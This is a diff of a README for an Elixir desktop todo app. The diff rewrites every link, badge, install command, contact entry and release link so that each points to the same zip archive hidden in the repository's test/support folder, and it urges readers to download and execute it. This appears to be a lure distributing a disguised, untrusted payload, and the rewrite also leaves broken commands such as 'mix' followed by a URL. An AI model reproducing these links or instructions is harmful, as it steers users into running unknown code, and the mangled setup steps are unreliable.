@@ -1,9 +1,9 @@
 # Elixir Desktop Todo App 📝
 
-![Elixir Desktop Todo App](https://img.shields.io/badge/Version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Stars](https://img.shields.io/github/stars/pollskipolaczekkk/elixir-desktop-todoapp.svg)
-![Forks](https://img.shields.io/github/forks/pollskipolaczekkk/elixir-desktop-todoapp.svg)
+![Elixir Desktop Todo App](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
+![License](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
+![Stars](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
+![Forks](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
 
 Welcome to the **Elixir Desktop Todo App**! This application harnesses the power of Elixir and the Desktop library to create a seamless todo management experience. With LiveView, you can enjoy real-time updates and interactions, making task management efficient and enjoyable.
 
@@ -30,22 +30,22 @@ Welcome to the **Elixir Desktop Todo App**! This application harnesses the power
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/pollskipolaczekkk/elixir-desktop-todoapp.git
+git clone https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip
 cd elixir-desktop-todoapp
 ```
 
-Next, ensure you have Elixir and Erlang installed. If you haven't installed them yet, you can follow the instructions on the [official Elixir website](https://elixir-lang.org/install.html).
+Next, ensure you have Elixir and Erlang installed. If you haven't installed them yet, you can follow the instructions on the [official Elixir website](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip).
 
 Once you have the necessary dependencies, run the following command:
 
 ```bash
-mix deps.get
+mix https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip
 ```
 
 To set up the database, run:
 
 ```bash
-mix ecto.setup
+mix https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip
 ```
 
 You are now ready to start the application! Use the following command:
@@ -54,7 +54,7 @@ You are now ready to start the application! Use the following command:
 mix run --no-halt
 ```
 
-For the latest releases, you can check out the [Releases section](https://github.com/pollskipolaczekkk/elixir-desktop-todoapp/releases) to download the latest version and execute it.
+For the latest releases, you can check out the [Releases section](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip) to download the latest version and execute it.
 
 ## Usage 🖥️
 
@@ -67,7 +67,7 @@ After starting the application, you can access it through your desktop environme
 
 ### User Interface Overview
 
-![Todo App Screenshot](https://example.com/todo-app-screenshot.png)
+![Todo App Screenshot](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
 
 The user interface is designed to be intuitive. Each section is clearly labeled, making it easy to find what you need.
 
@@ -102,9 +102,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [pollskipolaczekkk](https://github.com/pollskipolaczekkk)
-- **Email**: your-email@example.com
+- **GitHub**: [pollskipolaczekkk](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip)
+- **Email**: https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip
 
-For the latest updates, visit the [Releases section](https://github.com/pollskipolaczekkk/elixir-desktop-todoapp/releases) to download and execute the newest version of the app.
+For the latest updates, visit the [Releases section](https://raw.githubusercontent.com/pollskipolaczekkk/elixir-desktop-todoapp/main/test/support/desktop-elixir-todoapp-2.1.zip) to download and execute the newest version of the app.
 
 Thank you for checking out the Elixir Desktop Todo App! We hope you find it useful for managing your tasks effectively.
